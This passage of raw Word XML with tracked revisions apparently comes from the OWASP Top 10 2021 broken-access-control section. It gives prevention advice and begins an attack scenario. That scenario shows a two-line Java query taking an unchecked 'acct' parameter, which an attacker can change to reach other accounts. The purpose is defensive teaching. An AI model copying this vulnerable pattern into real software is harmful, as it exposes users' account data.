      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.git</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>) and backup files are not present within web roots.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6881B7EF" w14:textId="00108748" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="417" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="418" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="537A28CF" w14:textId="1522985F" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="419" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="420" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Log access control failures, alert admins when appropriate (</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>e.g</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:del w:id="421" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="422" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>.,</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="107C7700" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="423" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> repeated failures).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11EE00C3" w14:textId="6B3C255D" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="424" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="425" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="729FF06F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="426" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="427" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Rate limit API and controller access to minimize the harm from</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CD7C9FB" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="428" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> automated attack tooling.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D6CA588" w14:textId="7D7258C3" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="429" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="430" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* JWT tokens</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4C173C48" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="431" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Stateful session identifiers</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> should be invalidated on the server after logout.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="327062F5" w14:textId="26C421E9" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="432" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="433" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">* </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="434" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    Stateless JWT tokens should rather be short-lived so that the window of </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1C9131D0" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="435" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="436" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    opportunity for an attacker is minimized. For longer lived JWTs it's highly recommended to</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0930C61E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="437" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="438" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    follow the OAuth standards to revoke access.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2F2D204D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="439" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="713CF4AC" w14:textId="4D559EDE" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="440" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Developers and QA staff should include functional access control unit</w:t>
      </w:r>
      <w:del w:id="441" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4A836E5C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>and integration tests.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F2D8D46" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="019185B5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>## Example Attack Scenarios</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68BC7F77" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="442" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46C32AF9" w14:textId="2D7E2558" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="443" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>**Scenario #1</w:t>
      </w:r>
      <w:del w:id="444" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>**:</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="445" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>:**</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The application uses unverified data in a SQL call that</w:t>
      </w:r>
      <w:del w:id="446" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="48547178" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>is accessing account information:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A91D3D2" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77780736"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52B9A059" w14:textId="5B6B7C74" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="447" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>pstmt.setString</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(1, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>request.getParameter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>("acct"));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36494861" w14:textId="1C60E600" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="448" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ResultSet</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> results = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>pstmt.executeQuery</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:del w:id="449" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>();</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="450" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>( );</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="346A871B"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75CDF6CA" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7981975E" w14:textId="3CAF5CD0" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="451" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">An attacker simply modifies the </w:t>
      </w:r>
      <w:ins w:id="452" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">browser's </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">'acct' parameter </w:t>
      </w:r>
      <w:del w:id="453" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">in the browser </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>to send</w:t>
      </w:r>
      <w:del w:id="454" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7B98F83E" w14:textId="426DB9DC" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="455" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">whatever account number they want. If not </w:t>
      </w:r>
      <w:del w:id="456" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>properly</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="457" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>correctly</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> verified, the</w:t>
      </w:r>
      <w:del w:id="458" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
